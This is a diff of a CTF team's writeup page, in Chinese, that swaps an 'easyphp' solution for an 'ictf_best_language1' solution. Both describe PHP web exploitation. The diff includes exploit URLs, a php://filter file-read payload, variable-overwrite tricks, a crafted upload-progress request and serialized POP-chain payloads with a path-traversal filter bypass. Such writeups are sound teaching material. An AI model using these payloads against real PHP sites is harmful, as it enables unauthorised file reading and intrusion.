@@ -13,7 +13,7 @@
         <meta name="description" content="writeups of f61d team">
       
       
-        <link rel="canonical" href="https://f61d.github.io/web/PHP/ichunqiuCTF_easyphp/">
+        <link rel="canonical" href="https://f61d.github.io/web/PHP/ictf_best_language1/">
       
       
         <meta name="author" content="f61d">
@@ -42,7 +42,7 @@
     
     
       
-        <title>ichunqiuCTF_easyphp - f61d</title>
+        <title>ictf_best_language1 - f61d</title>
       
     
     
@@ -91,7 +91,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="#ctf" tabindex="1" class="md-skip">
+      <a href="#ictf_best_language1_writeup" tabindex="1" class="md-skip">
         Skip to content
       </a>
     
@@ -117,7 +117,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                ichunqiuCTF_easyphp
+                ictf_best_language1
               
             </span>
           
@@ -440,20 +440,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-    <a href="./" title="ichunqiuCTF_easyphp" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../ichunqiuCTF_easyphp/" title="ichunqiuCTF_easyphp" class="md-nav__link">
       ichunqiuCTF_easyphp
     </a>
-    
   </li>
 
         
@@ -461,11 +452,45 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../ictf_best_language1/" title="ictf_best_language1" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        ictf_best_language1
+      </label>
+    
+    <a href="./" title="ictf_best_language1" class="md-nav__link md-nav__link--active">
       ictf_best_language1
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ictf_best_language1_writeup" class="md-nav__link">
+    ictf_best_language1_writeup
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -1189,8 +1214,22 @@
 <nav class="md-nav md-nav--secondary">
   
   
-    
   
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ictf_best_language1_writeup" class="md-nav__link">
+    ictf_best_language1_writeup
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
   
 </nav>
                   </div>
@@ -1202,144 +1241,263 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/f61d/f61d.github.io/blob/dev/docs/web/PHP/ichunqiuCTF_easyphp.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                  <a href="https://github.com/f61d/f61d.github.io/blob/dev/docs/web/PHP/ictf_best_language1.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                <h1 id="ctf">网络内生安全试验场——CTF答题夺旗赛（第二季）<a class="headerlink" href="#ctf" title="Permanent link">&para;</a></h1>
-<h1 id="easyphp">easyphp<a class="headerlink" href="#easyphp" title="Permanent link">&para;</a></h1>
-<h2 id="analyze">Analyze<a class="headerlink" href="#analyze" title="Permanent link">&para;</a></h2>
-<p>查看网页源码</p>
+                  <h1>ictf_best_language1</h1>
+                
+                <h2 id="ictf_best_language1_writeup">ictf_best_language1_writeup<a class="headerlink" href="#ictf_best_language1_writeup" title="Permanent link">&para;</a></h2>
+<p><strong>第一步、代码审计</strong></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这次i春秋举办的ictf是一场以练习为主的ctf竞赛，很多题目还是很不错的，其中这一道源码审计的题目我认为很有意思，涵盖了变量覆盖，反序列化，本地文件包含，以及session.upload_progress.enabled的知识点，是一道很有意思的题目，以下是详细解题过程：
+<div class="codehilite"><pre><span></span>&lt;?php
+    error_reporting(0);  
+    highlight_file(__FILE__);
+    include(&#39;secret_key.php&#39;);
+    if(!empty($_GET[&quot;name&quot;])) {
+    $arr = array($_GET[&quot;name&quot;],$secret_key);
+    $data = &quot;Welcome my friend %s&quot;;
+    foreach ($arr as $k =&gt; $v) {
+        $data = sprintf($data,$v);                       //格式化字符串漏洞的（我也不知道是不是叫这个），输入的name为%s就能读取到秘钥  th3_k3y_y0u_cann0t_guess2333           
+    }
+    echo $data;
+    }
+
+
+    if( ($secret_key) === $_GET[&#39;key&#39;]){
+        echo &quot;you get the key&quot;;
+        $first=&#39;aa&#39;;
+        $ccc=&#39;amdin&#39;;
+        $i=1;
+        foreach($_GET as $key =&gt; $value) {
+                if($i===1)
+                {
+                    $i++;
+                    $$key = $value;                                   //变量覆盖，但是只能覆盖一个，所以我们把first放GET参数第一个，赋值为 u
+                }
+                else{break;}
+        }
+        if($first===&quot;u&quot;)
+        {
+            echo &quot;shi fu 666&quot;;
+            $file=&#39;phpinfo.php&#39;;
+            $func = $_GET[&#39;function&#39;];
+            call_user_func($func,$_GET);                             //来个变量覆盖函数 extract   然后把ccc赋值为F1ag  注意：由于后面有include,所以我们还可以改$file参数，可以利用LFI读取到class.php的源码
+                                                                       还有call_user_func函数，第一个是函数名，第二个是传入的参数，但是只能传一个参数，传多个参数使用call_user_func_array
+            if($ccc===&quot;F1ag&quot;)
+            {
+                echo &quot;tqltqltqltqltql&quot;;
+                require(&#39;class.php&#39;);
+                include($file);
+            }
+
+
+
+
+        }
+        else
+        {
+            echo &quot;Can you hack me?&quot;;
+        }
+    }
+</pre></div>
+这一段代码中需要利用的几个知识点：</p>
+<ol>
+<li><code>$data = sprintf($data,$v);</code>这一句是有格式化字符串漏洞的（我也不知道是不是叫这个），输入的name为%s就能读取到秘钥  th3_k3y_y0u_cann0t_guess2333</li>
+<li><code>$$key = $value;</code> 存在变量覆盖漏洞，但是根据上下文只能覆盖一个变量，所以我们把first放GET参数第一个，赋值为 u</li>
+<li><code>call_user_func($func,$_GET);</code>这个地方可以调用函数，由于需要满足后面的<code>if($ccc==="F1ag")</code>，所以我们调用具有变量覆盖漏洞的函数<code>extract()</code>，然后将ccc赋值为F1ag， 其中call_user_func函数，第一个是函数名，第二个是传入的参数，但是只能传一个参数，传多个参数使用call_user_func_array <strong>注意：由于后面有include,所以我们还可以改$file参数，可以利用LFI读取到class.php的源码</strong></li>
+<li>这里都有LFI了，应该可以getshell才对，通过包含：/proc/self/environ 或者日志文件。。。但是都没有权限，甚至/etc/passwd也读不到</li>
+</ol>
+<p>由于有<code>require('class.php');</code>的一句，所以我们直接通过php伪协议读取class.php的源码，payload如下:
+<div class="codehilite"><pre><span></span>http://120.55.43.255:13006/?first=u&amp;name=%s&amp;key=th3_k3y_y0u_cann0t_guess2333&amp;function=extract&amp;ccc=F1ag&amp;file=php://filter/read=convert.base64-encode/resource=class.php
+</pre></div>
+源码如下:
+<div class="codehilite"><pre><span></span>&lt;?php
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+session_start();
+class Monitor {
+    public $test;
+    function __construct() {
+        $this-&gt;test =&quot;index.php&quot;;
+    }
+
+
+    function __destruct() {
+    echo &quot;
+file:&quot; .$this-&gt;test.&quot;
+&quot;;
+}
+}
+
+
+class Welcome {
+    public $obj;
+    public $var;
+    function __construct(){
+        $this-&gt;var=&#39;success&#39;;
+        $this-&gt;obj=null;
+    }
+    function __toString(){
+        $this-&gt;obj-&gt;execute();
+        return $this-&gt;var.&quot;&quot;;
+    }
+
+
+
+}
+class Come{
+    public $method;
+    public $args;
+    function __construct($method, $args) {
+        $this-&gt;method = $method;
+        $this-&gt;args = $args;
+    }
+    function __wakeup(){
+        foreach($this-&gt;args as $k =&gt; $v) {
+            $this-&gt;args[$k] = $this-&gt;waf(trim($v));
+        }
+    }
+    function waf($str){
+        $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str);
+        $str=str_replace(&#39;/../&#39;,&#39;&#39;,$str);
+        $str=str_replace(&#39;../&#39;,&#39;&#39;,$str);
+        return $str;
+    }
+    function get_dir($path){
+        print_r(scandir(&quot;/tmp&quot;.$path));
+    }
+
+
+    function execute() {
+        if (in_array($this-&gt;method, array(&quot;get_dir&quot;))) {
+            call_user_func_array(array($this, $this-&gt;method), ($this-&gt;args));                                    //call_user_func_array函数第一个参数也是传函数名，而这个传数组就是array($this, $this-&gt;method)表示$this::method，第二个参数以数组的形式传入多个参数
+        }
+    }
+}
+?&gt;
+</pre></div>
+知识点：<code>ini_set('session.serialize_handler', 'php');</code>，这个显然与session设置有关，由phpinfo()页面知，<code>session.upload_progress.enabled</code>为On。当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据。所以可以通过<code>Session Upload Progress</code>来设置session。</p>
+<p>因此我们构造表单
 <div class="codehilite"><pre><span></span>&lt;html&gt;
-    &lt;head&gt;
-    &lt;/head&gt;
-    &lt;body&gt;
-        &lt;img src=&quot;show.php?img=aGludC5qcGc=&quot; width=&quot;100%&quot;&gt;
-    &lt;/body&gt;
+&lt;head&gt;
+    &lt;title&gt;upload&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form action=&quot;http://120.55.43.255:13006/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+        &lt;input type=&quot;submit&quot; /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
 &lt;/html&gt;
 </pre></div>
+<strong>注意，这个弄出来的HTTP头少了一个Accept-Encoding，需要加上头部字段：Accept-Encoding: gzip, deflate</strong></p>
+<p>然后得到http请求头为：
+<div class="codehilite"><pre><span></span>POST /class.php HTTP/1.1
+Host: 120.55.43.255:13006
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------57052814523281
+Content-Length: 714
+Connection: close
+Cookie: PHPSESSID=6o6k31opf8h9cmeb60mu2gaac1
+Upgrade-Insecure-Requests: 1
 
+-----------------------------57052814523281
+Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;
 
-<p>访问页面时发现有一张图片，查看图片地址</p>
-<div class="codehilite"><pre><span></span>http://120.55.43.255:13005/show.php?img=aGludC5qcGc=
+123
+-----------------------------57052814523281
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123&quot;     //这个filename就是我们要反序列化的地方
+Content-Type: text/plain
+
+wewetert
+
+-----------------------------57052814523281--
 </pre></div>
-
-
-<p><code>aGludC5qcGc=</code>base64解码得到<code>hint.jpg</code>，由此可以得知<code>show.php</code>是将参数<code>img</code>经base64解码得到的值进行读文件操作。</p>
-<p>尝试使用</p>
-<div class="codehilite"><pre><span></span>php://filter/read=convert.base64-encode/resource=index.php
-</pre></div>
-
-
-<p>base64解码值读取源码</p>
-<div class="codehilite"><pre><span></span>http://120.55.43.255:13005/show.php?img=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluZGV4LnBocA==
-</pre></div>
-
-
-<p>返回"File not found!"。。。</p>
-<h2 id="get-source">Get Source<a class="headerlink" href="#get-source" title="Permanent link">&para;</a></h2>
-<p>纠结了一下下，不知道是怎么回事，然后又尝试直接将<code>index.php</code>base64编码，可看到注释掉的php源码，居然成功了，看来是想复杂了。</p>
-<p>上源码：</p>
-<p>index.php</p>
-<div class="codehilite"><pre><span></span>&lt;?php 
-  require_once(&#39;hint.php&#39;);
-  $x = new hint();
-  isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
-  if (!empty($g)) {
-    $x = unserialize($g);
-    echo $x;
-  }
-?&gt;
-</pre></div>
-
-
-<p>发现hint.php</p>
+其中第二个filename变量就是我们要填写序列化字符串的地方
+这个序列化如何构造呢？
 <div class="codehilite"><pre><span></span>&lt;?php
-  error_reporting(0);
-  //flag is in flag.php
-  class hint
-  { 
-    public $file=&#39;&#39;;
-    function __destruct()
-    { 
-      if(!empty($this-&gt;file)) 
-      {
-       if(strchr($this-&gt; file,&quot;\\&quot;)===false &amp;&amp;  strchr($this-&gt;file, &#39;/&#39;)===false)
-          show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file);
-       else      die(&#39;Wrong filename.&#39;);
-      }
-    }  
-    function __wakeup(){ 
-      $this-&gt; file=&#39;index.php&#39;; 
-    } 
-    public function __toString(){
-      return &#39;&#39; ;
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+session_start();
+class Monitor {
+    public $test;
+    function __construct() {
+        $this-&gt;test =new Welcome();
     }
-  } 
-?&gt;
-</pre></div>
 
 
-<p>源码中的注释部分提示flag在flag.php中</p>
-<p>想尝试用show.php直接读取flag.php，分析show.php：</p>
-<div class="codehilite"><pre><span></span>&lt;?php
-  $f = $_GET[&#39;img&#39;];
-  if (!empty($f)) {
-    $f = base64_decode($f);
-    if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE
-    &amp;&amp; stripos($f,&#39;flag&#39;)===FALSE) {
-      readfile($f);
-    } else {
-      echo &quot;File not found!&quot;;
-    }
-  }
-?&gt;
-</pre></div>
-
-
-<p>发现<code>flag</code>被过滤了，而且<code>/</code>也被绕过了，这也是为什么之前使用<code>php://filter</code>出错的原因。</p>
-<p>尝试绕过，不过过滤比较严格，绕过有点难度，转而分析其他两个文件。</p>
-<h2 id="unserialize">Unserialize<a class="headerlink" href="#unserialize" title="Permanent link">&para;</a></h2>
-<p>涉及到**反序列化**：<code>$x = unserialize($g);</code>,发现在hint.php中</p>
-<div class="codehilite"><pre><span></span>function __destruct()
-{ 
-  if(!empty($this-&gt;file)) 
-  {
-   if(strchr($this-&gt; file,&quot;\\&quot;)===false &amp;&amp;  strchr($this-&gt;file, &#39;/&#39;)===false)
-      show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file);
-   else      die(&#39;Wrong filename.&#39;);
-  }
+    function __destruct() {
+    echo &quot;
+file:&quot; .$this-&gt;test.&quot;
+&quot;;
 }
+}
+
+
+class Welcome {
+    public $obj;
+    public $var;
+    function __construct(){
+        $this-&gt;var=&#39;{$_GET}&#39;;
+        $this-&gt;obj=new Come(&#39;get_dir&#39;,array(&#39;/....//var/www/html&#39;));
+    }
+    function __toString(){
+        $this-&gt;obj-&gt;execute();
+        return $this-&gt;var.&quot;&quot;;
+    }
+
+
+
+}
+class Come{
+    public $method;
+    public $args;
+    function __construct($method, $args) {
+        $this-&gt;method = $method;
+        $this-&gt;args = $args;
+    }
+    function __wakeup(){
+        foreach($this-&gt;args as $k =&gt; $v) {
+            $this-&gt;args[$k] = $this-&gt;waf(trim($v));
+        }
+    }
+    function waf($str){
+        $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str);
+        $str=str_replace(&#39;/../&#39;,&#39;&#39;,$str);
+        $str=str_replace(&#39;../&#39;,&#39;&#39;,$str);
+        return $str;
+    }
+    function get_dir($path){
+        print_r(scandir(&quot;/tmp&quot;.$path));
+    }
+
+
+    function execute() {
+        if (in_array($this-&gt;method, array(&quot;get_dir&quot;))) {
+            call_user_func_array(array($this, $this-&gt;method), ($this-&gt;args));
+        }
+    }
+}
+
+
+
+
+$c = new Monitor();
+$d= str_replace(&#39;&quot;&#39;, &#39;\\&quot;&#39;, serialize($c));
+var_dump($d);
+?&gt;
 </pre></div>
-
-
-<p>存在文件读取，可以构造**Payload**使得<code>$this-&gt; file = "flag.php"</code>，由</p>
-<div class="codehilite"><pre><span></span>&lt;?php
-  error_reporting(0);
-    //flag is in flag.php
-    class hint{ 
-    public $file=&#39;&#39;;
-    function __destruct(){ 
-      if(!empty($this-&gt;file)) {
-       if(strchr($this-&gt; file,&quot;\\&quot;)===false &amp;&amp;  strchr($this-&gt;file, &#39;/&#39;)===false)
-          show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file);
-       else      die(&#39;Wrong filename.&#39;);
-      }}  
-    function __wakeup(){ $this-&gt; file=&#39;index.php&#39;; } 
-    public function __toString(){return &#39;&#39; ;}
-  } 
-  $a = new hint();
-  $a-&gt;file = &quot;flag.php&quot;;
-  echo serialize($a);
+注意两个地方：
+1. <code>$this-&gt;test =new Welcome();</code>，这个反序列化的利用逻辑就是通过<code>Monitor</code>类的<code>__destruct</code>方法调用到<code>Welcome</code>类的<code>__toString</code>方法，再调用到<code>Come</code>类的<code>execute</code>方法，达到执行函数的目的，其中，<code>execute</code>方法中，由于是<code>$this-&gt;method</code>，所以只能调用类的方法，不能随便调用系统函数，也就是<code>get_dir</code>方法。
+2. <code>$this-&gt;obj=new Come('get_dir',array('/....//var/www/html'));</code>这里主要两点，首先是路径必须以数组的形式传，因为<code>call_user_func_array</code>函数要求传入数组作为参数，其次是绕过waf，这个waf太好绕过了，因为这种利用两个<code>str_replace()</code>的waf，通常可以利用后一个来绕过前一个，所以/....//就会变成/../就可以跳到上一目录了</p>
+<p>从而得到payload:
+<div class="codehilite"><pre><span></span>&quot;O:7:\&quot;Monitor\&quot;:1:{s:4:\&quot;test\&quot;;O:7:\&quot;Welcome\&quot;:2:{s:3:\&quot;obj\&quot;;O:4:\&quot;Come\&quot;:2:{s:6:\&quot;method\&quot;;s:7:\&quot;get_dir\&quot;;s:4:\&quot;args\&quot;;a:1:{i:0;s:19:\&quot;/....//var/www/html\&quot;;}}s:3:\&quot;var\&quot;;s:7:\&quot;{$_GET}\&quot;;}}&quot;
 </pre></div>
-
-
-<p>得到字符串 <code>O:4:"hint":1:{s:4:"file";s:8:"flag.php";}</code>，但是这样并不能读取到flag.php文件，因为在序列化时，<code>__wakeup()</code>函数又会将<code>"index.php"</code>赋值给<code>$this-&gt; file</code>.</p>
-<p>这里涉及的另一个知识，是php本身的一个bug，详细信息可以查询<a href="https://www.baidu.com/s?wd=php%20bug%2072663"><code>php bug 72663</code></a>，这个 bug 的原理是：当反序列化字符串中，表示**属性个数的值大于真实属性个数**时，会跳过<code>__wakeup</code> 函数的执行。</p>
-<p>于是将hint值改为2</p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/web/PHP/ichunqiuCTF_easyphp/index_files/ichunqiuCTF_easyphp.png" /></p>
-<p>Payload：</p>
-<div class="codehilite"><pre><span></span>http://120.55.43.255:13005/index.php?class=O:4:&quot;hint&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
-</pre></div>
+也是要注意，里面的双引号前面记得加上\作为转义符，并且最前面的O之前需要加一个 | ,这都是php_session反序列化的格式</p>
+<p>最后说一点，这题目权限给的很低，我当时读取根目录都无法读取，整个系统似乎就/tmp与/var/www/html有读权限，这其实挺坑的。。害得我一度怀疑人生。</p>
+<p>有一说一，这个题拿来练习做好不过了，准备等学弟学反序列化了，考考他们(我真过分)。</p>
                 
                   
                 
@@ -1360,7 +1518,7 @@
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../WHUCTF-EasyPHP/" title="WHUCTF-EasyPHP" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../ichunqiuCTF_easyphp/" title="ichunqiuCTF_easyphp" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -1369,19 +1527,19 @@
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                WHUCTF-EasyPHP
+                ichunqiuCTF_easyphp
               </span>
             </div>
           </a>
         
         
-          <a href="../ictf_best_language1/" title="ictf_best_language1" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../../SQLi/RootersCTF-Babyweb/" title="RootersCTF-Babyweb" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                ictf_best_language1
+                RootersCTF-Babyweb
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
